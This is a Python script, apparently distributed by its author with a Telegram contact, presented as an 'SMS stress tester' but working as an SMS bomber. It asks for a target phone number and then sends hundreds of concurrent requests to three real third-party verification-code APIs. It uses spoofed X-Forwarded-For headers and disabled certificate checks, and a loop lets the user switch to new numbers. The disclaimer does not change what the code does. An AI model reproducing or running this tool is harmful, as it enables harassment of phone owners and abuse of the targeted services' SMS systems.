# -*- coding: utf-8 -*-
import sys
import time
import random
import threading
import os

# --- 网页环境适配层 ---
# 提示：在浏览器容器中，requests 已由 apps/云端同步工具.py 预先安装
try:
    import requests
    import urllib3
    from concurrent.futures import ThreadPoolExecutor
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    print("环境加载中，请稍候...")

# --- 开发者身份 ---
def print_banner():
    print("="*60)
    print("🚀 开发者: 奶龙 | 联系方式(飞机): TG@NL78991")
    print("🔥 奶龙智能高速短信测压机 v10.0 (Web Edition)")
    print("-" * 60)
    print("【法律免责声明】")
    print("本程序仅供开发者进行接口压力测试使用。")
    print("严禁利用本工具从事任何非法骚扰。后果由使用者承担。")
    print("="*60)

class NL_Turbo_Engine:
    def __init__(self, phone):
        self.phone = phone
        self.stats = {"success": 0, "fail": 0, "start_time": 0}
        self.lock = threading.Lock()
        self.session = requests.Session()

    def _get_api_config(self, idx):
        # 保持原有接口逻辑
        configs = [
            ("云创动力", "https://jkyc.necloud.com.cn/QXRTOC/user/qxrtoc_wxxcxUserRegistCode", {"phone": self.phone}),
            ("小熊美术", "https://www.xiaoxiongmeishu.com/api/m/v1/sms/sendCodeV2", {"bizOrigin": "APP", "mobile": f"+86{self.phone}"}),
            ("供应管理", "https://www.scmmgr.cn/scm//orderRegisterUser/getPollCode", {"mobileNo": self.phone, "msgType": "2"})
        ]
        return configs[idx % 3]

    def _execute(self, index):
        node_name, url, payload = self._get_api_config(index)
        fingerprint = f"NL-{random.randint(1000, 9999)}"
        headers = {
            "User-Agent": f"Mozilla/5.0 (Linux; Android {random.randint(10,14)}) NL-Engine/10.0",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        }
        try:
            r = self.session.post(url, json=payload if isinstance(payload, dict) else payload, headers=headers, timeout=8, verify=False)
            success = (r.status_code == 200)
            with self.lock:
                if success: self.stats["success"] += 1
                else: self.stats["fail"] += 1
            print(f"[{index:03d}] {'✅' if success else '❌'} 节点:[{node_name:<6}] | 状态:{r.status_code}")
        except:
            with self.lock: self.stats["fail"] += 1
            print(f"[{index:03d}] ⚠️ 节点:[{node_name:<6}] | 链路阻塞")

    def run(self, total, threads):
        self.stats = {"success": 0, "fail": 0, "start_time": time.time()}
        print(f"\n[🚀 启动] 目标:{self.phone} | 线程负载:{threads}\n" + "-"*40)
        with ThreadPoolExecutor(max_workers=threads) as ex:
            list(ex.map(self._execute, range(1, total + 1)))
        self.show_summary(total)

    def show_summary(self, total):
        duration = time.time() - self.stats["start_time"]
        success = self.stats["success"]
        print("\n📊 奶龙测压总结 📊")
        print("-" * 30)
        print(f"● 成功击穿: {success}")
        print(f"● 链路拦截: {self.stats['fail']}")
        print(f"● 综合胜率: {(success/total)*100:.2f}%")
        print(f"● 执行耗时: {duration:.2f} 秒")
        print("-" * 30)

def main():
    print_banner()
    
    # --- 关键修改：增加详尽的输入提示语 ---
    phone = input("【第一步：目标设定】\n请输入要测压的手机号码：").strip()
    
    total_raw = input("【第二步：压力总量】\n请输入预发送的总请求数（建议100-500）：").strip()
    total = int(total_raw) if total_raw.isdigit() else 100
    
    print("\n[负载调节] [A]智能模式 (推荐) | [M]手动输入")
    mode = input("【第三步：并发模式】\n请输入 A (智能) 或 M (手动)：").lower()
    
    if mode == 'a':
        threads = max(5, min(int((total ** 0.5) * 2), 50)) # 网页端线程不宜过大
        print(f"⚙️ 智能并发已设定为: {threads}")
    else:
        threads_raw = input("【手动模式】\n请输入并发线程数（1-50）：")
        threads = int(threads_raw) if threads_raw.isdigit() else 10
    
    engine = NL_Turbo_Engine(phone)
    
    while True:
        engine.run(total, threads)
        
        print("\n[1] 修改参数重新开始")
        print("[3] 彻底结束进程并退出")
        
        # 网页版采用简化版控制逻辑
        choice = input("【任务待命】\n输入 1 换号继续，输入 3 退出：")
        
        if choice == '3':
            print("\n[🛡️ 奶龙] 正在切断链路... 进程终结。")
            break
        elif choice == '1':
            phone = input("【更换目标】\n请输入新的手机号码：").strip()
            engine = NL_Turbo_Engine(phone)
        else:
            print("\n[🔄 自动补给] 正在重载链路...")
            time.sleep(2)

if __name__ == "__main__":
    main()
